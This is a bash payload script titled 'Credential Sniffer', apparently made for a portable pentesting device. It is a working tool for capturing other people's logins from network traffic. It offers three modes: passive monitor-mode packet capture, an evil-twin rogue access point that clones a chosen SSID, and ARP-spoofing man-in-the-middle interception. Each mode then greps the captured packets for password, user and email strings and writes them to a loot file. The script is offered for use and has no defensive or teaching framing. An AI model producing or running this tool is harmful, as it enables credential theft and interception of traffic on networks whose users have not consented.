#!/bin/bash
# Title: Credential Sniffer
# Author: bad-antics
# Description: Passive credential capture from network traffic
# Category: nullsec/capture

PROMPT "CREDENTIAL SNIFFER

Passively capture
credentials from:

- HTTP forms
- FTP logins  
- SMTP/POP/IMAP
- Telnet sessions

Press OK to continue."

INTERFACE="wlan0"

PROMPT "SNIFF MODE:

1. Monitor (passive)
2. Evil Twin + Sniff
3. ARP Spoof + Sniff

Mode 1 = stealthy
Mode 2/3 = active

Enter mode next."

SNIFF_MODE=$(NUMBER_PICKER "Mode (1-3):" 1)

LOOT_DIR="/mmc/nullsec/creds"
mkdir -p "$LOOT_DIR"
LOOT_FILE="$LOOT_DIR/creds_$(date +%Y%m%d_%H%M%S).txt"

echo "Credential Sniffer Log" > "$LOOT_FILE"
echo "Date: $(date)" >> "$LOOT_FILE"
echo "Mode: $SNIFF_MODE" >> "$LOOT_FILE"
echo "---" >> "$LOOT_FILE"

DURATION=$(NUMBER_PICKER "Duration (min):" 5)
DURATION_SEC=$((DURATION * 60))

case $SNIFF_MODE in
    1) # Passive monitor
        airmon-ng check kill 2>/dev/null
        airmon-ng start $INTERFACE >/dev/null 2>&1
        MON_IF="${INTERFACE}mon"
        [ ! -d "/sys/class/net/$MON_IF" ] && MON_IF="$INTERFACE"
        
        LOG "Passive sniffing..."
        SPINNER_START "Sniffing traffic..."
        
        # Capture packets with credential patterns
        timeout $DURATION_SEC tcpdump -i $MON_IF -w "$LOOT_DIR/capture_$$.pcap" 2>/dev/null &
        
        sleep $DURATION_SEC
        
        SPINNER_STOP
        airmon-ng stop $MON_IF 2>/dev/null
        
        # Parse for creds
        if [ -f "$LOOT_DIR/capture_$$.pcap" ]; then
            # Look for HTTP POST
            strings "$LOOT_DIR/capture_$$.pcap" | grep -iE "pass=|password=|pwd=|user=|login=|email=" >> "$LOOT_FILE"
            
            CRED_COUNT=$(wc -l < "$LOOT_FILE")
            PROMPT "SNIFF COMPLETE

Captured for ${DURATION}m
Found ~$CRED_COUNT patterns

PCAP saved for analysis.
Check $LOOT_FILE

Press OK to exit."
        fi
        ;;
        
    2) # Evil Twin mode
        PROMPT "EVIL TWIN MODE

Will create rogue AP
and sniff all traffic.

Enter target SSID next."
        
        TARGET_SSID=$(TEXT_PICKER "SSID to clone:" "Free_WiFi")
        
        # Create hostapd config
        cat > /tmp/hostapd_sniff.conf << HOSTAPD_EOF
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
channel=6
hw_mode=g
HOSTAPD_EOF
        
        LOG "Starting Evil Twin..."
        SPINNER_START "Running Evil Twin + Sniffer..."
        
        hostapd /tmp/hostapd_sniff.conf &
        HOSTAPD_PID=$!
        
        sleep 2
        
        # Start dhcp
        dnsmasq --interface=$INTERFACE --dhcp-range=192.168.4.2,192.168.4.100,12h --no-daemon &
        DNSMASQ_PID=$!
        
        # Sniff
        tcpdump -i $INTERFACE -w "$LOOT_DIR/eviltwin_$$.pcap" 2>/dev/null &
        TCPDUMP_PID=$!
        
        sleep $DURATION_SEC
        
        kill $TCPDUMP_PID $HOSTAPD_PID $DNSMASQ_PID 2>/dev/null
        SPINNER_STOP
        
        # Parse
        strings "$LOOT_DIR/eviltwin_$$.pcap" | grep -iE "pass|user|login|email" >> "$LOOT_FILE"
        
        PROMPT "EVIL TWIN COMPLETE

Duration: ${DURATION}m
SSID: $TARGET_SSID

Check $LOOT_FILE
for captured creds.

Press OK to exit."
        ;;
        
    3) # ARP Spoof mode
        PROMPT "ARP SPOOF MODE

Requires connected
to target network.

Enter gateway IP next."
        
        GATEWAY=$(TEXT_PICKER "Gateway IP:" "192.168.1.1")
        TARGET_IP=$(TEXT_PICKER "Target IP (or ALL):" "ALL")
        
        LOG "Starting ARP spoof..."
        SPINNER_START "ARP Spoofing + Sniffing..."
        
        echo 1 > /proc/sys/net/ipv4/ip_forward
        
        if [ "$TARGET_IP" = "ALL" ]; then
            arpspoof -i $INTERFACE -t $GATEWAY >/dev/null 2>&1 &
        else
            arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY >/dev/null 2>&1 &
            arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP >/dev/null 2>&1 &
        fi
        
        ARPSPOOF_PID=$!
        
        tcpdump -i $INTERFACE -w "$LOOT_DIR/arpspoof_$$.pcap" port 80 or port 21 or port 23 or port 110 or port 143 2>/dev/null &
        TCPDUMP_PID=$!
        
        sleep $DURATION_SEC
        
        kill $TCPDUMP_PID 2>/dev/null
        killall arpspoof 2>/dev/null
        echo 0 > /proc/sys/net/ipv4/ip_forward
        
        SPINNER_STOP
        
        strings "$LOOT_DIR/arpspoof_$$.pcap" | grep -iE "pass|user|login" >> "$LOOT_FILE"
        
        PROMPT "ARP SPOOF COMPLETE

Duration: ${DURATION}m
Gateway: $GATEWAY

Check $LOOT_FILE
for captured creds.

Press OK to exit."
        ;;
esac
